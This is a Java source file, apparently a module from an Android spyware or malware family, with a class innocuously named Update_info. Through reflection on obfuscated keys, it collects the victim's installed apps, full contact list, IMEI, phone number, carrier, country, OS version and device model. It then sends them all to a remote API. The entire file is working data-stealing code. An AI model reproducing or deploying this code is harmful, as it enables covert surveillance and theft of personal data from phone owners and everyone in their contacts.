package com.moonny.mods_src;

import org.json.JSONObject;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Update_info {

    public int MAIN_VER_REQUIRED = 100; // minimum Main api version required
    private Object mods;
    private Method run_func;
    private Method api_request;

    public Update_info(HashMap<String, Object> system) throws Exception
    {
        this.mods = system.get("a4");
        this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
        this.api_request = mods.getClass().getDeclaredMethod((String) system.get("a7"), JSONObject.class, String.class, String.class);
    }

    public JSONObject run(JSONObject params) throws Exception {

        run_func.invoke(mods, "main", "set_pref", new Object[]{"p14", true});
        JSONObject json = new JSONObject();

        json.put("m", "ui"); // update_info

        json.put("2", (String) run_func.invoke(mods, "main", "get_packages", null)); // JSON app1|app2,...
        json.put("1", (JSONObject) run_func.invoke(mods, "main", "get_contacts", null)); // JSON Name:319028882222,Name:319028882222,...

        json.put("101", (String) run_func.invoke(mods, "main", "get_imei", null));
        json.put("102", (String) run_func.invoke(mods, "main", "get_country", null));
        json.put("103", (String) run_func.invoke(mods, "main", "get_operator", null));
        json.put("104", (String) run_func.invoke(mods, "main", "get_os_ver", null));
        json.put("105", (String) run_func.invoke(mods, "main", "get_device_model", null));
        json.put("90", (String) run_func.invoke(mods, "main", "get_number", null));
        json.put("108", (String) run_func.invoke(mods, "main", "get_language", null));

        api_request.invoke(mods, json, "", "");
        return null;
    }

}
